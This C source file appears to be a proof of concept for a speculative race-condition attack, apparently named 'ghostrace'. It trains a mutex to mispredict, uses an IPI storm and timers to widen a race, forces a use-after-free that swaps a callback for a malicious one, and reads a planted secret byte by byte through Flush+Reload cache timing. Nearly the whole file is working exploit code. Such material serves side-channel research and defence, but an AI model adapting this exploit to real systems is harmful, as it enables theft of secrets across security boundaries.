#define _GNU_SOURCE
#include "utils/fr.h"
#include "utils/timer.h"
#include "utils/ipi.h"
#include <stdbool.h>
#include <string.h>
#define ATTACKER_CPU 1
#define L3_CACHE_LINE_SIZE 4096*4
#define THRESHOLD 250
#define NUM_THREADS 22

typedef void (*callback_t)(int* arg);
typedef struct victim_struct
{
    callback_t callback;
} victim_struct;
extern struct itimerspec spec;
victim_struct *v_st;
pthread_t victim;
pthread_mutex_t lock;
unsigned long timer_length;
unsigned long training_epochs;
char *SECRET = "This is the secret we will leak";
char buf[L3_CACHE_LINE_SIZE * 255 + 1]__attribute__((aligned(4096)));
volatile int ret __cacheline_aligned;
int freed = 0;
int finished = 0;


int benign_callback(int* arg)
{
    return 0;
}

void evil_callback(char *c)
{
    char data = *c;
    buf[*c * L3_CACHE_LINE_SIZE] = 1;
}

void flush_buf()
{
    for (int j = 0; j < 255; j++)
        flush(&buf[j * L3_CACHE_LINE_SIZE]);
    flush(&lock);
}

void leak_secret(char *secret, int offset)
{

    //pthread_t probe_thread;
    ret = pthread_mutex_trylock(&lock);
    flush(&ret);
   // pthread_create(&probe_thread, NULL, v_st->callback, secret+offset);
   // nanosleep(&spec, 0);
   // pthread_cancel(probe_thread);
   if (likely(ret == 0))
   {
       v_st->callback(secret + offset);
       pthread_mutex_unlock(&lock);
       //printf("here!\n");
   }
}


void ipi_delay(unsigned long num_pid)
{
    //nanosleep(&spec, NULL);
    for (int i = 0; i < num_pid; i++)
        getpid();
}


char spectre_read(char *secret, int offset)
{
    char c = 0x0;
    flush_buf();

    leak_secret(secret, offset);

    for (int j = 0; j < 255; j++)
    {
        unsigned long timing;
        if ((timing = probe_timing(&buf[j * L3_CACHE_LINE_SIZE])) < THRESHOLD)
        {
            c = j;
            flush(&buf[j * L3_CACHE_LINE_SIZE]);
             //printf("Hit timing %d --> j == %c\n", timing, j);
            // printf("j: %d\n", j);
            break;
        }

            //printf("Miss timing %d\n", timing);
    }

    flush_buf();
    
    return c;
}

void victim_thread()
{
    //printf("victim here!\n");
    pin_cpu(VICTIM_CPU);
    timer_start();
    
    clock_t start = clock();
    
    pthread_mutex_lock(&lock);
    
   // free(v_st);
    freed = 1;
    float j = 0;
    for (int i = 0; i < INT64_MAX; i += 2)
    {
        i--;
    }

    //  Must interrupt exactly between free and mutex unlock for this to work
    pthread_mutex_unlock(&lock);
    clock_t end = clock();
    // free structure here?
    double time = (double)1e3 * (end - start) / CLOCKS_PER_SEC;
    printf("Victim Thread Time: %7.2fms with timer resolution %ld\n", time, timer_length);
    finished = 1;
    pthread_exit(NULL);
}

void start_victim()
{
    pthread_create(&victim, NULL, victim_thread, NULL);
}

void train_lock()
{
    unsigned long i;
    for (i = 0; i < training_epochs; i++)
    {
        pthread_mutex_lock(&lock);
        pthread_mutex_unlock(&lock);
    }
}

int main(int argc, char **argv)
{
    /*
        [ARGUMENTS]

        Arg1 --> timer length
        Arg2 --> lock training epochs
        Arg3 --> num getpid() to delay ipi storm

    */
    if (argc < 3)
    {
        printf("Expected: ghostrace timer_length training_epochs num_pid\n");
        exit(0);
    }
    timer_length = atol(argv[1]);
    training_epochs = atol(argv[2]);
    unsigned long num_pid = atol(argv[3]);
    struct timespec delay;
    delay.tv_sec = 0;
    delay.tv_nsec = 100;//(spec.it_value.tv_nsec / 200000) * 1;

   // printf("argv[1] : %ld, argv[2] : %ld\n", timer_length, training_epochs);

    /*
        Set up the victim structure
    */
    v_st = malloc(sizeof(victim_struct));
    v_st->callback = benign_callback;
   // printf("Allocated victim structure.\n");

    /*
        Other setup and initialization
    */
    int ret = pthread_mutex_init(&lock, NULL);
    assert(ret == 0);
    ipi_register(NUM_THREADS);
    timer_init(timer_length);
    pin_cpu(ATTACKER_CPU);
   // printf("Finished setup.\n");
    memset(buf, 'x', sizeof(buf));
    flush_buf();
    train_lock();
    printf("Trained Lock\n");
    //pthread_mutex_lock(&lock);
    //flush(&lock);
    //if (likely(pthread_mutex_trylock(&lock) == 0))
    //{
    //    buf[*SECRET * L3_CACHE_LINE_SIZE] = 1;
    //    pthread_mutex_unlock(&lock);
    //}
    //printf("Timing %d\n",  probe_timing(&buf['T'*L3_CACHE_LINE_SIZE]));
    //leak_secret(SECRET, 0);
    //printf("\n%c\n", spectre_read(SECRET, 0));
    

   // return 0;
    
    start_victim();
    

    ipi_delay(num_pid);

    begin_ipi_storm();
    //timer_wait(); // we still get delay without waiting
    //
    
   // printf("Finished timer_wait()\n");

    /*
        Memory allocation collision
        
    */

    
   // if (!freed)
   // {
   //     printf("not freed!\n");
   //     timer_cleanup();
   //     return;
   // }
    
    free(v_st);

    victim_struct *p = malloc(sizeof(victim_struct));
    p->callback = evil_callback;
    assert(p);
    if (v_st != p)
    {
        printf("UAF failed!\n");
        timer_cleanup();
        return;
    }
    if (finished)
    {
        printf("Finished!\n");
        timer_cleanup();
    }
    printf("UAF Succeeded!\n");

   // pthread_create(&probe_thread, NULL, v_st->callback, secret+offset);
   // nanosleep(&spec, 0);
   // pthread_cancel(probe_thread);

    
    for (int i = 0; i < strlen(SECRET); i++)
    {
        printf("%c", spectre_read(SECRET, i));
    }
        
    printf("\n");
    kill_ipi();
   // timer_cleanup();
    
    //pthread_join(victim, NULL);
   // while(1);
}